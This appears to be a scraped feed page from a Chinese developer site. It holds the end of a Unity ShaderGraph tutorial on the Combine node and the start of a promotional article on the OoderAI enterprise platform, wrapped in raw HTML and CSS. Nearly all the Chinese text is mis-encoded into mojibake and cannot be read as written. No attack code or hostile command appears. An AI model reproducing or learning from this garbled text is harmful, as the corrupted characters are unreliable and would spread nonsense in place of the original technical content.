<p>ä¸ºä¼˜åŒ–æ€§èƒ½ï¼Œåº”å‡å°‘CombineèŠ‚ç‚¹çš„é‡å¤ä½¿ç”¨ï¼Œå°¤å…¶åœ¨å®æ—¶æ¸²æŸ“åœºæ™¯ä¸­ã€‚å¯é€šè¿‡åˆå¹¶è¾“å…¥å‚æ•°æˆ–é€‰ç”¨é«˜æ•ˆèŠ‚ç‚¹ï¼ˆå¦‚BlendèŠ‚ç‚¹ï¼‰æ›¿ä»£éƒ¨åˆ†æ“ä½œã€‚å»ºè®®å°†å¸¸ç”¨å‘é‡å°è£…ä¸ºSubgraphä»¥é™ä½ç½‘ç»œå¤æ‚åº¦ï¼Œå¹¶åˆ©ç”¨ShaderGraphçš„LODï¼ˆç»†èŠ‚å±‚æ¬¡ï¼‰åŠŸèƒ½ï¼Œåœ¨è¿œè·ç¦»æ¸²æŸ“æ—¶ç®€åŒ–è¾“å…¥ï¼Œæƒè¡¡ç”»è´¨ä¸æ€§èƒ½ã€‚</p>
<h3 data-id="heading-13">å®é™…ç¤ºä¾‹</h3>
<h4 data-id="heading-14">ç¤ºä¾‹1ï¼šåŸºç¡€é¢œè‰²ç»„åˆ</h4>
<p>åˆ›å»ºåŸºç¡€æè´¨æ—¶ï¼Œä½¿ç”¨CombineèŠ‚ç‚¹åˆå¹¶é¢œè‰²å€¼ä¸é€æ˜åº¦ã€‚å…·ä½“æ­¥éª¤ï¼šå°†ColorèŠ‚ç‚¹çš„RGBè¾“å‡ºè¿æ¥è‡³CombineèŠ‚ç‚¹çš„Rã€Gã€Bç«¯å£ï¼ŒFloatèŠ‚ç‚¹ï¼ˆæ§åˆ¶é€æ˜åº¦ï¼‰è¿æ¥è‡³Aç«¯å£ï¼Œè¾“å‡ºVector4åˆ†åˆ«æ¥å…¥ä¸»èŠ‚ç‚¹çš„Base Colorä¸Alphaç«¯å£ã€‚æ­¤æ–¹æ³•é€‚ç”¨äºUIå…ƒç´ æˆ–é€æ˜ç‰©ä½“ï¼ˆå¦‚ç»ç’ƒã€æ°´ä½“ï¼‰çš„æ¸²æŸ“ã€‚</p>
<h4 data-id="heading-15">ç¤ºä¾‹2ï¼šå…‰ç…§å‚æ•°ç»„åˆ</h4>
<p>åœ¨PBRç€è‰²å™¨ä¸­ï¼Œä»çº¹ç†é‡‡æ ·èŠ‚ç‚¹æå–æ¼«åå°„ã€é«˜å…‰åŠç¯å¢ƒå…‰å¼ºåº¦ï¼Œè¾“å…¥CombineèŠ‚ç‚¹ç”ŸæˆVector3ï¼Œå†ä¼ é€’è‡³è‡ªå®šä¹‰å‡½æ•°èŠ‚ç‚¹è¿›è¡Œé«˜çº§å…‰ç…§è®¡ç®—ã€‚è¯¥æ–¹å¼æ”¯æŒåŠ¨æ€è°ƒæ•´å…‰ç…§å‚æ•°ï¼Œå¦‚å®ç°æ˜¼å¤œå¾ªç¯æ•ˆæœã€‚</p>
<h4 data-id="heading-16">ç¤ºä¾‹3ï¼šæ‰­æ›²æ•ˆæœå®ç°</h4>
<p>æ¨¡æ‹Ÿçƒ­æ‰­æ›²æ•ˆæœæ—¶ï¼Œä½¿ç”¨NoiseèŠ‚ç‚¹ç”Ÿæˆéšæœºä½ç§»å€¼è¾“å…¥CombineèŠ‚ç‚¹çš„Rç«¯å£ï¼Œé¢œè‰²å€¼è¾“å…¥Gç«¯å£ï¼Œç”ŸæˆVector2ç”¨äºUVåç§»ï¼Œåˆ›å»ºåŠ¨æ€æ‰­æ›²è§†è§‰ã€‚æ­¤æŠ€æœ¯å¸¸è§äºæ¸¸æˆä¸­çš„ç«ç„°ã€æŠ˜å°„åœºæ™¯ã€‚</p>
<h3 data-id="heading-17">æ€»ç»“ä¸æ‹“å±•åº”ç”¨</h3>
<p>CombineèŠ‚ç‚¹ä½œä¸ºShaderGraphçš„å…³é”®ç»„ä»¶ï¼Œé€šè¿‡ç›´è§‚çš„å‘é‡ç»„åˆæœºåˆ¶ï¼Œæ˜¾è‘—ç®€åŒ–äº†æè´¨ä¸ç®—æ³•å¼€å‘ã€‚ç»“åˆSplitèŠ‚ç‚¹ã€Texture2DèŠ‚ç‚¹åŠæ•°å­¦è¿ç®—èŠ‚ç‚¹ï¼Œå¯å®ç°æ›´å¤æ‚çš„è§†è§‰æ•ˆæœï¼Œå¦‚æµä½“æ¨¡æ‹Ÿä¸­åˆå¹¶æµé€Ÿä¸å¯†åº¦ç”ŸæˆVector4ã€‚åœ¨VR/ARå¼€å‘ä¸­ï¼Œè¯¥èŠ‚ç‚¹è¿˜èƒ½æ•´åˆä¼ æ„Ÿå™¨æ•°æ®ï¼Œæ”¯æŒå®æ—¶äº¤äº’æ¸²æŸ“ã€‚</p>
<h3 data-id="heading-18">å¸¸è§é—®é¢˜è§£ç­”</h3>
<h4 data-id="heading-19">1. CombineèŠ‚ç‚¹æ”¯æŒå“ªäº›è¾“å…¥ç±»å‹ï¼Ÿ</h4>
<p>CombineèŠ‚ç‚¹æ¥å—æµ®ç‚¹å€¼è¾“å…¥ï¼ŒèŒƒå›´ä¸€èˆ¬ä¸º[0,1]ã€‚è¾“å…¥æºå¯åŒ…æ‹¬ColorèŠ‚ç‚¹ã€FloatèŠ‚ç‚¹æˆ–æ•°å­¦è¿ç®—èŠ‚ç‚¹è¾“å‡ºï¼Œæ”¯æŒå¸¸é‡æˆ–åŠ¨æ€å˜é‡ï¼ˆå¦‚é€šè¿‡åŠ¨ç”»æ›²çº¿æ§åˆ¶çš„å‚æ•°ï¼‰ã€‚</p>
<h4 data-id="heading-20">2. å¦‚ä½•è°ƒæ•´CombineèŠ‚ç‚¹çš„è¾“å‡ºç»´åº¦ï¼Ÿ</h4>
<p>è¾“å‡ºç»´åº¦ç”±å·²è¿æ¥çš„è¾“å…¥æ•°é‡å†³å®šï¼šè¿æ¥Rå’ŒGå¾—Vector2ï¼Œå¢åŠ Bå¾—Vector3ï¼Œå…¨è¿æ¥å¾—Vector4ã€‚å¼€å‘è€…å¯é€šè¿‡è„šæœ¬åŠ¨æ€è°ƒæ•´è¿æ¥ï¼Œå¦‚åœ¨è¿è¡Œæ—¶ä½¿ç”¨Scriptable Renderer Featureä¿®æ”¹èŠ‚ç‚¹é…ç½®ã€‚</p>
<h4 data-id="heading-21">3. CombineèŠ‚ç‚¹åœ¨æ€§èƒ½æ–¹é¢æœ‰ä½•å½±å“ï¼Ÿ</h4>
<p>è¯¥èŠ‚ç‚¹æœ¬èº«è®¡ç®—è½»é‡ï¼Œä½†è¿‡åº¦ä½¿ç”¨å¯èƒ½å¢åŠ æ•´ä½“è´Ÿè½½ã€‚å»ºè®®åœ¨æ€§èƒ½æ•æ„Ÿåœºæ™¯ä¸­ä¼˜åŒ–ä½¿ç”¨ï¼Œå¦‚ç§»åŠ¨ç«¯é¡¹ç›®é‡‡ç”¨ä½ç²¾åº¦è¾“å…¥ä»¥å‡å°‘å†…å­˜å ç”¨ã€‚</p>
<h3 data-id="heading-22">è¿›é˜¶æŠ€å·§</h3>
<h4 data-id="heading-23">1. ç»“åˆä½¿ç”¨Combineå’ŒSplitèŠ‚ç‚¹</h4>
<p>Combineä¸SplitèŠ‚ç‚¹ååŒå·¥ä½œï¼Œå¯å®ç°å‘é‡åˆ†åˆæ“ä½œã€‚ä¾‹å¦‚ï¼Œå…ˆå°†æ³•çº¿ã€é«˜åº¦åŠç²—ç³™åº¦æ•°æ®åˆå¹¶ä¸ºVector4ï¼Œå†é€šè¿‡SplitèŠ‚ç‚¹æå–ç‹¬ç«‹åˆ†é‡ç”¨äºä¸åŒè®¡ç®—é˜¶æ®µï¼Œæå‡èŠ‚ç‚¹ç½‘ç»œçš„æ¨¡å—åŒ–ä¸å¤ç”¨æ€§ã€‚</p>
<h4 data-id="heading-24">2. åŠ¨æ€è°ƒæ•´è¾“å…¥å€¼</h4>
<p>ç»“åˆTimeèŠ‚ç‚¹æˆ–SliderèŠ‚ç‚¹åŠ¨æ€æ§åˆ¶è¾“å…¥å€¼ï¼Œå¯åˆ›å»ºåŠ¨ç”»æ•ˆæœã€‚ä¾‹å¦‚ï¼Œé€šè¿‡CombineèŠ‚ç‚¹åˆå¹¶æ—¶é—´å˜é‡ä¸è‰²å½©æ•°æ®ï¼Œå®ç°åŠ¨æ€å½©è™¹æè´¨ï¼Œæˆ–åˆ©ç”¨Player InputèŠ‚ç‚¹è°ƒæ•´å‘é‡å‚æ•°ï¼Œå¢å¼ºæ¸¸æˆäº¤äº’æ€§ã€‚</p>
<h4 data-id="heading-25">3. ç»“åˆä½¿ç”¨UVCombineèŠ‚ç‚¹</h4>
<p>åœ¨å¤„ç†UVåæ ‡æ—¶ï¼Œé…åˆUVCombineèŠ‚ç‚¹ï¼ˆæ”¯æŒé€‰æ‹©UVé€šé“åŠåº”ç”¨å¹³é“º/åç§»ï¼‰ä¸CombineèŠ‚ç‚¹ï¼Œå¯å®ç°å¤æ‚çº¹ç†æ˜ å°„ã€‚å¦‚åœ¨åœ°å½¢ç€è‰²å™¨ä¸­ï¼Œç”¨UVCombineå¤„ç†å¤šçº¹ç†å±‚ï¼Œå†é€šè¿‡CombineèŠ‚ç‚¹åˆå¹¶ç»“æœï¼Œç”Ÿæˆæ··åˆå‘é‡ç”¨äºç»†èŠ‚æ¸²æŸ“ã€‚</p>
<hr/>
<blockquote>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fblog.csdn.net%2Fchenghai37%2Fcategory_13074589.html%3Ffromshare%3Dblogcolumn%26sharetype%3Dblogcolumn%26sharerId%3D13074589%26sharerefer%3DPC%26sharesource%3Dchenghai37%26sharefrom%3Dfrom_link" target="_blank" title="https://blog.csdn.net/chenghai37/category_13074589.html?fromshare=blogcolumn&amp;sharetype=blogcolumn&amp;sharerId=13074589&amp;sharerefer=PC&amp;sharesource=chenghai37&amp;sharefrom=from_link" ref="nofollow noopener noreferrer">ã€Unity Shader Graph ä½¿ç”¨ä¸ç‰¹æ•ˆå®ç°ã€‘</a><strong>ä¸“æ -ç›´è¾¾</strong>
ï¼ˆæ¬¢è¿<em>ç‚¹èµç•™è¨€</em>æ¢è®¨ï¼Œæ›´å¤šäººåŠ å…¥è¿›æ¥èƒ½æ›´åŠ å®Œå–„è¿™ä¸ªæ¢ç´¢çš„è¿‡ç¨‹ï¼ŒğŸ™ï¼‰</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[OoderAI ä¼ä¸šçº§ AI è§£å†³æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7593139476832665643</link>    <guid>https://juejin.cn/post/7593139476832665643</guid>    <pubDate>2026-01-09T04:10:22.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7593139476832665643" data-draft-id="7592921639464075306" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="OoderAI ä¼ä¸šçº§ AI è§£å†³æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="å¼€æº,äººå·¥æ™ºèƒ½"/> <meta itemprop="datePublished" content="2026-01-09T04:10:22.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="OneCodeCN"/> <meta itemprop="url" content="https://juejin.cn/user/1427583415622366"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            OoderAI ä¼ä¸šçº§ AI è§£å†³æ–¹æ¡ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1427583415622366/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    OneCodeCN
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T04:10:22.000Z" title="Fri Jan 09 2026 04:10:22 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">ä¸€ã€æ ¸å¿ƒæ¶æ„æ¦‚è¿°</h2>
<p>OoderAIæ˜¯ä¸€å¥— ä¼ä¸šçº§ AI è§£å†³æ–¹æ¡ˆä»¥â€œAI å¤§è„‘â€ä¸ºæ ¸å¿ƒé©±åŠ¨ï¼Œè”åŠ¨ä¸‰å¤§æ ¸å¿ƒå¥—ä»¶ï¼ˆSkillFlow æµç¨‹å¥—ä»¶ã€A2UI ç”»å¸ƒå¥—ä»¶ã€OneCode ç¯å¢ƒå¥—ç å¥—ä»¶ï¼‰æ„å»ºå…¨é“¾è·¯æŠ€æœ¯é—­ç¯ã€‚è¯¥æ¶æ„é€šè¿‡â€œæ ¸å¿ƒé©±åŠ¨-æµç¨‹ç®¡æ§-äº¤äº’ç”Ÿæˆ-ç¯å¢ƒæ”¯æ’‘â€çš„åˆ†å±‚è®¾è®¡ï¼Œå®ç° AI èƒ½åŠ›çš„å¯æ§å¤–å»¶ã€äººæœºäº¤äº’çš„æ™ºèƒ½ç”Ÿæˆä»¥åŠæ•°æ®ä»£ç çš„ä¸€è‡´æ€§ç®¡æ§ï¼Œä»æ ¹æºä¸Šè§£å†³ä¼ä¸šçº§ AI åº”ç”¨è½åœ°ä¸­çš„â€œèƒ½åŠ›ä¸å¯æ§ã€äº¤äº’ä¸çµæ´»ã€ä»£ç ä¸ä¸€è‡´â€ä¸‰å¤§æ ¸å¿ƒç—›ç‚¹ï¼Œä¸ºä¼ä¸šæä¾›é«˜æ•ˆã€å®‰å…¨ã€å¯æ‰©å±•çš„ AI èµ‹èƒ½æ–¹æ¡ˆã€‚</p>
<p>â€‹</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f713f1f083d04d6e9dc7d66ed674a927~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768536622&amp;x-signature=ShG6ug%2BKNKvhMjb49y3uojkPc8s%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<h2 data-id="heading-1">äºŒã€æ ¸å¿ƒç»„ä»¶è¯¦è§£</h2>
<h3 data-id="heading-2">ï¼ˆä¸€ï¼‰æ ¸å¿ƒé©±åŠ¨ï¼šAI å¤§è„‘</h3>
<p>AI å¤§è„‘æ˜¯æ•´ä¸ªè§£å†³æ–¹æ¡ˆçš„å†³ç­–ä¸è°ƒåº¦æ ¸å¿ƒï¼Œè´Ÿè´£ç»Ÿç­¹ä¸‰å¤§å¥—ä»¶çš„ååŒè¿ä½œã€‚å…¶æ ¸å¿ƒä»·å€¼åœ¨äºæ•´åˆå…¨åŸŸä¸šåŠ¡æ•°æ®ä¸æŠ€èƒ½èµ„æºï¼Œé€šè¿‡æ™ºèƒ½ç®—æ³•å®ç°éœ€æ±‚è§£æã€ä»»åŠ¡åˆ†é…ã€æµç¨‹è°ƒåº¦ä¸ç»“æœæ ¡éªŒã€‚ä¸€æ–¹é¢ï¼ŒAI å¤§è„‘æ¥æ”¶æ¥è‡ªä¸šåŠ¡ç«¯çš„éœ€æ±‚æŒ‡ä»¤ï¼Œé€šè¿‡è‡ªç„¶è¯­è¨€ç†è§£ä¸ä¸šåŠ¡åœºæ™¯åŒ¹é…ï¼Œæ‹†è§£ä¸ºå¯æ‰§è¡Œçš„ä»»åŠ¡å•å…ƒï¼›å¦ä¸€æ–¹é¢ï¼Œæ ¹æ®ä»»åŠ¡å±æ€§åŠ¨æ€è°ƒç”¨ SkillFlow çš„æµç¨‹èƒ½åŠ›ã€A2UI çš„äº¤äº’ç”Ÿæˆèƒ½åŠ›ä»¥åŠ OneCode çš„ç¯å¢ƒç¼–è¯‘èƒ½åŠ›ï¼Œå½¢æˆâ€œéœ€æ±‚-æ‰§è¡Œ-è¾“å‡ºâ€çš„å…¨é“¾è·¯é—­ç¯ï¼ŒåŒæ—¶å¯¹å„ç¯èŠ‚çš„æ‰§è¡ŒçŠ¶æ€è¿›è¡Œå®æ—¶ç›‘æ§ï¼Œç¡®ä¿ AI åº”ç”¨çš„å¯æ§æ€§ä¸ç¨³å®šæ€§ã€‚</p>
<p>â€‹</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8509272793444a858fdc627d2732bb11~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768536622&amp;x-signature=jvzdJ1SjMatEQe3qrdehFLGMEaE%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<h3 data-id="heading-3">ï¼ˆäºŒï¼‰ä¸‰å¤§æ ¸å¿ƒå¥—ä»¶</h3>
<h4 data-id="heading-4">1. SkillFlow æµç¨‹å¥—ä»¶â€”â€”å¯æ§çš„ AI å¤–å»¶èƒ½åŠ›å¼•æ“</h4>
<p>SkillFlow èšç„¦ AI èƒ½åŠ›çš„æµç¨‹åŒ–ç®¡æ§ä¸å¤–å»¶æ‰©å±•ï¼Œé€šè¿‡ MCP æœåŠ¡ã€Skill èƒ½åŠ›æ‰©å±•ã€Workflow è¾¹ç•Œæ§åˆ¶ä¸‰å¤§æ ¸å¿ƒæœºåˆ¶ï¼Œè®© AI å¤§è„‘å…·å¤‡â€œå¯æ‰©å±•ã€å¯ç®¡æ§ã€å¯è¿½æº¯â€çš„å¤–å»¶èƒ½åŠ›ï¼Œè§£å†³ä¼ ç»Ÿ AI èƒ½åŠ›æ‰©å±•ä¸­â€œè¾¹ç•Œæ¨¡ç³Šã€ååŒæ··ä¹±ã€é£é™©ä¸å¯æ§â€çš„é—®é¢˜ã€‚</p>
<ul>
<li><strong>MCP æœåŠ¡è¿æ¥æ ¸å¿ƒ</strong>ï¼šé‡‡ç”¨ MCPï¼ˆModel Context Protocolï¼‰æ ‡å‡†åŒ–åè®®ä½œä¸º AI ä¸å¤–éƒ¨ç³»ç»Ÿçš„äº¤äº’æ¡¥æ¢ï¼Œå¦‚åŒâ€œAI çš„é€šç”¨ USB-C æ¥å£â€ï¼Œå®ç° AI å¤§è„‘ä¸ä¼ä¸šç°æœ‰ä¸šåŠ¡ç³»ç»Ÿã€æ•°æ®æºã€ç¬¬ä¸‰æ–¹å·¥å…·çš„æ— ç¼å¯¹æ¥ã€‚é€šè¿‡ MCP æœåŠ¡ï¼ŒAI å¯å®‰å…¨è°ƒç”¨å¤–éƒ¨ä¸šåŠ¡æ•°æ®ã€æ‰§è¡Œç³»ç»Ÿæ“ä½œï¼ŒåŒæ—¶ä¿éšœæ•°æ®ä¼ è¾“çš„æ ‡å‡†åŒ–ä¸å®‰å…¨æ€§ï¼Œé¿å…å¼‚æ„ç³»ç»Ÿé›†æˆä¸­çš„å…¼å®¹æ€§é—®é¢˜ã€‚</li>
<li><strong>Skill èƒ½åŠ›æ‰©å±•ä½“ç³»</strong>ï¼šæ„å»ºæ¨¡å—åŒ– Skill èƒ½åŠ›åº“ï¼Œæ¶µç›–æ•°æ®å¤„ç†ã€ä¸šåŠ¡å®¡æ‰¹ã€æŠ¥è¡¨ç”Ÿæˆç­‰å„ç±»ä¼ä¸šçº§ä»»åŠ¡æ¨¡æ¿ã€‚AI å¤§è„‘å¯æ ¹æ®ä¸šåŠ¡éœ€æ±‚åŠ¨æ€åŠ è½½æ‰€éœ€ Skillï¼Œå®ç°èƒ½åŠ›çš„æŒ‰éœ€æ‰©å±•ã€‚Skill é‡‡ç”¨â€œæ¸è¿›å¼åŠ è½½â€è®¾è®¡ï¼Œä»…åœ¨ä»»åŠ¡æ‰§è¡Œæ—¶åŠ è½½ç›¸å…³æŠ€èƒ½æ¨¡å—ï¼Œå¤§å¹…æå‡ AI ä¸Šä¸‹æ–‡å¤„ç†æ•ˆç‡ï¼Œé¿å…ä¼ ç»Ÿèƒ½åŠ›æ‰©å±•ä¸­â€œå…¨é‡åŠ è½½å¯¼è‡´çš„èµ„æºå†—ä½™â€é—®é¢˜ã€‚</li>
<li><strong>Workflow è¾¹ç•Œæ§åˆ¶æœºåˆ¶</strong>ï¼šé€šè¿‡å¯è§†åŒ–æµç¨‹ç¼–æ’å·¥å…·å®šä¹‰ä»»åŠ¡æ‰§è¡Œçš„è¾¹ç•Œä¸è§„åˆ™ï¼Œæ˜ç¡®å„ Skill çš„è°ƒç”¨é¡ºåºã€æ•°æ®æµè½¬è·¯å¾„ä»¥åŠå¼‚å¸¸å¤„ç†é€»è¾‘ã€‚ä¾‹å¦‚ï¼Œåœ¨é‡‡è´­å®¡æ‰¹æµç¨‹ä¸­ï¼Œå¯é€šè¿‡ Workflow è®¾å®šâ€œæ•°æ®æ ¡éªŒ-å±‚çº§å®¡æ‰¹-ç»“æœå½’æ¡£â€çš„å›ºå®šé“¾è·¯ï¼Œé™åˆ¶ AI èƒ½åŠ›çš„æ‰§è¡ŒèŒƒå›´ï¼Œé¿å…è¶Šæƒæ“ä½œï¼ŒåŒæ—¶ç¡®ä¿æµç¨‹æ‰§è¡Œçš„å¯è¿½æº¯æ€§ï¼Œæ»¡è¶³ä¼ä¸šçº§åº”ç”¨çš„åˆè§„è¦æ±‚ã€‚</li>
</ul>
<h4 data-id="heading-5">2. ä¸€å¼ ç”»å¸ƒï¼ˆA2UIï¼‰â€”â€”AI åŸç”Ÿäººæœºäº¤äº’ç”Ÿæˆä¸­å¿ƒ</h4>
<p>ä½œä¸º Ooder RADï¼ˆå¿«é€Ÿåº”ç”¨å¼€å‘ï¼‰ä¸­å¿ƒçš„æ ¸å¿ƒç»„ä»¶ï¼Œä¸€å¼ ç”»å¸ƒä»¥â€œè‡ªæ²» UI ç»„ä»¶åº“+å¯è§†åŒ–è®¾è®¡å™¨â€ä¸ºåŸºç¡€ï¼Œä¾æ‰˜ A2UI åè®®å®ç° AI ç›´æ¥æ’°å†™äººæœºäº¤äº’ç•Œé¢çš„èƒ½åŠ›ï¼Œè§£å†³ä¼ä¸šçº§åº”ç”¨â€œç•Œé¢å¼€å‘æ•ˆç‡ä½ã€å¤šç«¯é€‚é…éš¾ã€äº¤äº’ä½“éªŒå·®â€çš„ç—›ç‚¹ã€‚</p>
<ul>
<li><strong>è‡ªæ²» UI ç»„ä»¶åº“</strong>ï¼šæä¾›ä¼ä¸šçº§æ ‡å‡†åŒ– UI ç»„ä»¶é›†ï¼Œç»„ä»¶å…·å¤‡â€œè‡ªæˆ‘ç®¡ç†çŠ¶æ€ã€è¡Œä¸ºä¸æ¸²æŸ“é€»è¾‘â€çš„ç‰¹æ€§ï¼Œå¯å®ç°ä¸ä¸šåŠ¡é€»è¾‘å±‚çš„è§£è€¦ã€‚ç»„ä»¶åº“æ¶µç›–è¡¨å•ã€æŠ¥è¡¨ã€åœ°å›¾ã€äº¤äº’æ§ä»¶ç­‰å…¨å“ç±»å…ƒç´ ï¼Œä¸”æ‰€æœ‰ç»„ä»¶å‡ç»è¿‡å®‰å…¨æ ¡éªŒï¼Œä»…å…è®¸ä»å¯ä¿¡ç»„ä»¶ç›®å½•ä¸­é€‰å–ï¼Œä»æ ¹æºé¿å…ä»£ç æ³¨å…¥é£é™©ã€‚</li>
